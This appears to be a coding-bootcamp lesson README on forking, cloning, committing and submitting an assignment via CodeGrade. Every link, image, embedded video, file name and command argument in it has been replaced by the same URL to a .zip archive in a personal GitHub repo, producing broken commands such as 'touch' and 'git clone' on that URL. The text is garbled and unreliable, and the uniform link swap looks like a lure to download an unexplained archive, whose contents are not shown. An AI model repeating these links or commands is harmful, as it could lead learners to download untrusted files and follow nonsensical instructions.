...
<iframe width="640" height="480" src="https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip" title="Completing and Submitting Software Engineering Assignments" frameborder="0" allowfullscreen></iframe>
...
[the previous lesson](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Screenshot pointing to OctoCat icon](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Screenshot point out 'Fork' button](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)

Click on that, and you should get a screen that looks something like this:

![Screenshot of the 'Create a new fork' form](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Screenshot showing example of forked repo](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
in the box below, starting with `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip`. You should see your GitHub
name after the `:`.

From here, click the copy button.

![clone-repo](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
```console
$ git clone https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
```
...
These instructions are now also available on your local machine in `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip`.
...
[workspace-trust]: https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
...
This assignment
  ...
  1) has a file named https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip

1) This assignment
      has a file named https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
    AssertionError: No file named 'https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip' found. Create one in the root of the assignment's directory: value: expected 'https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip' to exist
...
> from the AssertionError shown above, go back to the https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip installation
...
we just need to create a file called `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip` inside the assignment
...
Then use the `touch` command to create `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip`.

```console
$ touch https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
```
...
```console
$ ls
https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip         https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip               node_modules            https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip              https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip               https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip       test
```
...
that the `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip` file you created is not there. Notice in the screenshot
below, for example, `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip` exists in the local VS Code editor, but not
anywhere in the forked GitHub repo.

![Screenshot showing https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip in VS Code, but not in GitHub](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
[basics]:
  https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
[pushing-with-git]:
  https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
...
```bash
git add https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip
```
...
```bash
git commit -m "creates https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip"
```
...
should see the `https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip` file! With all your work now available on GitHub, you
...
![Load Complete Your First Software Engineering Assignment in a new window button](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Gif showing the CodeGrade interface, creating a submission, and connecting to GitHub](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Gif showing how to connect a GitHub repo on CodeGrade](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Gif showing the AutoTest running and completing](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![Gif showing how to navigate back to AutoTest via the Latest submission button](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
[this Stack Overflow post](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip) for more
...
1. Make sure that you've connected the correct repo to CodeGrade. You can do
   ...
   of the lab in the https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip file matches the title in Canvas. If you've
...
![disconnect repo button](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
...
![submit assignment button](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)

Clicking this button will bring you to the bottom of the page where you can
submit a URL link to your work.

![submit assignment form](https://raw.githubusercontent.com/GathogoG/phase-0-completing-assignments-codegrade/main/test/codegrade-phase-completing-assignments-v3.2.zip)
